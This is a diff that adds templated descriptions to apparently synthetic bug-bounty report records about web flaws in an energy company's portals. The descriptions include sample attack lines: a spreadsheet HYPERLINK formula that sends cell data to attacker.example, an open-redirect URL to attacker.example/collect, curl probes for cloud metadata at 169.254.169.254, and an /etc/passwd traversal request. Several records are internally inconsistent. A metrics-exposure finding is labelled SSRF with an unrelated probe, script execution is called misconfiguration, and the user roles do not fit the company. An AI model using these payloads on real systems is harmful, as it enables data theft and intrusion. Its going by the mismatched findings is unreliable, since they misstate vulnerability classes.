         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rheinspitze-energie.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1543,7 +1555,8 @@
           "offset": "8d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1683,7 +1696,8 @@
           "offset": "3d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1839,7 +1853,8 @@
           "offset": "7d 3h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1953,7 +1968,8 @@
           "offset": "3d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2091,7 +2107,8 @@
           "offset": "23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2211,7 +2228,8 @@
           "offset": "19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rheinspitze-energie.foo/import`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2334,7 +2352,8 @@
           "offset": "4d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rheinspitze-energie.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2449,7 +2468,8 @@
           "offset": "2d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2553,7 +2573,8 @@
           "offset": "2d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.rheinspitze-energie.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2648,7 +2669,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2819,7 +2841,8 @@
           "offset": "7d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rheinspitze-energie.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2946,7 +2969,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3093,7 +3117,8 @@
           "offset": "7d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.rheinspitze-energie.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3244,7 +3269,8 @@
           "offset": "5d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.rheinspitze-energie.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3350,7 +3376,8 @@
           "offset": "1d 1h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3477,7 +3504,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rheinspitze-energie.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3564,7 +3592,8 @@
           "offset": "22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3703,7 +3732,8 @@
           "offset": "3d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3863,7 +3893,8 @@
           "offset": "5d 18h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4015,7 +4046,8 @@
           "offset": "3d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.rheinspitze-energie.foo/profile`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4154,7 +4186,8 @@
           "offset": "6d 16h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4293,7 +4326,8 @@
           "offset": "4d 14h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rheinspitze-energie.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4440,7 +4474,8 @@
           "offset": "1d 6h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.rheinspitze-energie.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4576,7 +4611,8 @@
           "offset": "4d 8h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4747,7 +4783,8 @@
           "offset": "5d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.rheinspitze-energie.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4854,7 +4891,8 @@
           "offset": "2d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rheinspitze-energie.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4998,7 +5036,8 @@
           "offset": "1d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5142,7 +5181,8 @@
           "offset": "6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rheinspitze-energie.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5285,7 +5325,8 @@
           "offset": "3d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5421,7 +5462,8 @@
           "offset": "6d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.rheinspitze-energie.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5548,7 +5590,8 @@
           "offset": "4d 11h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
